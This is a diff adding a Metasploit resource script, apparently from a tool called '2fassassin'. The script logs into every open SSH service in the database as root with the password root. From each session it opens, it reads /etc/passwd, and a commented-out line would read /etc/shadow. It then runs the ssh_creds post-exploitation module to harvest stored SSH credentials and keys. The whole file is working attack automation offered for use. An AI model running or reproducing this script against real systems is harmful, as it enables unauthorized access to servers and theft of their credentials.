@@ -1,0 +1,33 @@
+use auxiliary/scanner/ssh/ssh_login
+#set USER_FILE /root/2fassassin/crack/wordlist/2fa-users.txt
+#set PASS_FILE /root/2fassassin/crack/wordlist/2fa-wordlist.txt
+set username root
+set password root
+set stop_on_success true
+set VERBOSE true
+spool /root/.msf4/loot/ssh_login.txt
+set THREADS 2
+
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "ssh" and service.state == "open"
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("run")
+      self.run_single("sessions -c 'show sessions'")
+      self.run_single("sessions -c 'cat /etc/passwd'")
+      #self.run_single("sessions -c 'cat /etc/shadow'")
+    end
+  end
+end
+</ruby>
+
+
+use post/multi/gather/ssh_creds
+set session 1
+run
+set session 2
+run
+exit -y
